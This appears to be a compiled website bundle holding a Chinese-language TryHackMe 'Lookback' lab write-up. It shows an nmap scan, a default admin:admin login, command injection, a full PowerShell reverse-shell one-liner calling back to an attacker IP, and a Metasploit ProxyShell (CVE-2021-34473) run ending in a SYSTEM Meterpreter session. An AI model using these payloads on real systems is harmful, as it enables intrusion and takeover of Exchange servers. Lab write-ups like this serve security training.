"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[150],{75767:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>s,metadata:()=>o,toc:()=>l});var a=n(74848),r=n(28453);const s={sidebar_position:73,tags:["Easy","Windows","\u547d\u4ee4\u6ce8\u5165","Exchange"],title:"Lookback",description:"Lookback",sidebar_label:"Lookback",slug:"/tryhackme/73"},i="Lookback",o={id:"box/TryHackMe/73",title:"Lookback",description:"Lookback",source:"@site/docs/box/TryHackMe/73.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/73",permalink:"/docs/tryhackme/73",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Windows",permalink:"/docs/tags/windows"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"Exchange",permalink:"/docs/tags/exchange"}],version:"current",sidebarPosition:73,frontMatter:{sidebar_position:73,tags:["Easy","Windows","\u547d\u4ee4\u6ce8\u5165","Exchange"],title:"Lookback",description:"Lookback",sidebar_label:"Lookback",slug:"/tryhackme/73"},sidebar:"boxSidebar",previous:{title:"Epoch",permalink:"/docs/tryhackme/72"},next:{title:"MD2PDF",permalink:"/docs/tryhackme/74"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"443",id:"443",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"admin",id:"admin",level:3},{value:"admin \u2014&gt; administrator",id:"admin--administrator",level:3}];function d(e){const t={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.h1,{id:"lookback",children:"Lookback"}),"\n",(0,a.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-185-114:~/lookback# nmap -sT -p- --min-rate 1000 -Pn 10.10.103.157\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-06 07:38 BST\nNmap scan report for ip-10-10-103-157.eu-west-1.compute.internal (10.10.103.157)\nHost is up (0.00033s latency).\nNot shown: 65532 filtered ports\nPORT     STATE SERVICE\n80/tcp   open  http\n443/tcp  open  https\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 100.26 seconds\n"})}),"\n",(0,a.jsx)(t.h2,{id:"443",children:"443"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703192651.png",alt:"20240703192651"})}),"\n",(0,a.jsxs)(t.p,{children:["\u53d1\u73b0\u4e00\u4e2a test \u9875\u9762, \u8bbf\u95ee\u53d1\u73b0\u9700\u8981\u63d0\u4f9b\u5bc6\u7801, \u6b64\u65f6\u6211\u5c1d\u8bd5\u4e86 admin",":admin"," \u5bc6\u7801\u5c31\u6210\u529f\u767b\u9646"]}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703192706.png",alt:"20240703192706"})}),"\n",(0,a.jsx)(t.p,{children:"\u5728\u6b64\u67e5\u770b\u540e, \u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u7a97\u53e3, \u968f\u610f\u8f93\u5165\u540e, \u6211\u731c\u6d4b\u5176\u540e\u7aef\u4ee3\u7801\u4e3a;"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"cmd = \"'c:\\' + user_input '\"\n"})}),"\n",(0,a.jsx)(t.p,{children:"\u63a5\u7740\u6211\u6784\u9020\u4e86\u7ed5\u8fc7\u8bed\u53e5"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703192719.png",alt:"20240703192719"})}),"\n",(0,a.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(t.h3,{id:"admin",children:"admin"}),"\n",(0,a.jsx)(t.p,{children:"\u7ecf\u8fc7\u4e0d\u65ad\u7684\u5c1d\u8bd5\u6700\u7ec8\u6211\u53d1\u73b0\u4e86\u53ef\u4ee5\u83b7\u53d6 Shell \u7684 Payload"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.185.114',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n"})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703192736.png",alt:"20240703192736"})}),"\n",(0,a.jsx)(t.h3,{id:"admin--administrator",children:"admin \u2014> administrator"}),"\n",(0,a.jsx)(t.p,{children:"\u5728\u7528\u6237 dev \u7684\u76ee\u5f55\u4e2d, \u6211\u53d1\u73b0\u4e86\u4e00\u4e2a TODO,txt \u6587\u4ef6"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"PS C:\\Users\\dev\\Desktop> type TODO.txt\nHey dev team,\n\nThis is the tasks list for the deadline:\n\nPromote Server to Domain Controller [DONE]\nSetup Microsoft Exchange [DONE]\nSetup IIS [DONE]\nRemove the log analyzer[TO BE DONE]\nAdd all the users from the infra department [TO BE DONE]\nInstall the Security Update for MS Exchange [TO BE DONE]\nSetup LAPS [TO BE DONE]\n\nWhen you are done with the tasks please send an email to:\n\njoe@thm.local\ncarol@thm.local\nand do not forget to put in CC the infra team!\ndev-infrastracture-team@thm.local\n"})}),"\n",(0,a.jsx)(t.p,{children:"\u4e4b\u540e\u7684\u770b\u4e86 WP \u624d\u77e5\u9053\u4f7f\u7528 MSF \u7684 Exchange \u6a21\u5757\u8fdb\u884c\u653b\u51fb"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOSTS 10.10.103.157\nRHOSTS => 10.10.103.157\nmsf6 exploit(windows/http/exchange_proxyshell_rce) > set LHOSt 10.10.185.114\nLHOSt => 10.10.185.114\nmsf6 exploit(windows/http/exchange_proxyshell_rce) > **set email dev-infrastracture-team@thm.local**\nemail => dev-infrastracture-team@thm.local\nmsf6 exploit(windows/http/exchange_proxyshell_rce) > run\n\n[*] Started reverse TCP handler on 10.10.185.114:4445 \n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[+] The target is vulnerable.\n[*] Attempt to exploit for CVE-2021-34473\n[*] Retrieving backend FQDN over RPC request\n[*] Internal server name: win-12ouo7a66m7.thm.local\n[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local\n[+] Successfully assigned the 'Mailbox Import Export' role\n[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)\n[*] Saving a draft email with subject 'IkP0bZTmzOc' containing the attachment with the embedded webshell\n[*] Writing to: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\4mA7z7gJ.aspx\n[*] Waiting for the export request to complete...\n[+] The mailbox export request has completed\n[*] Triggering the payload\n[*] Sending stage (200774 bytes) to 10.10.103.157\n[+] Deleted C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\4mA7z7gJ.aspx\n[*] Meterpreter session 1 opened (10.10.185.114:4445 -> 10.10.103.157:10073) at 2023-09-06 08:14:48 +0100\n[*] Removing the mailbox export request\n[*] Removing the draft email\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n"})})]})}function h(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>o});var a=n(96540);const r={},s=a.createContext(r);function i(e){const t=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),a.createElement(s.Provider,{value:t},e.children)}}}]);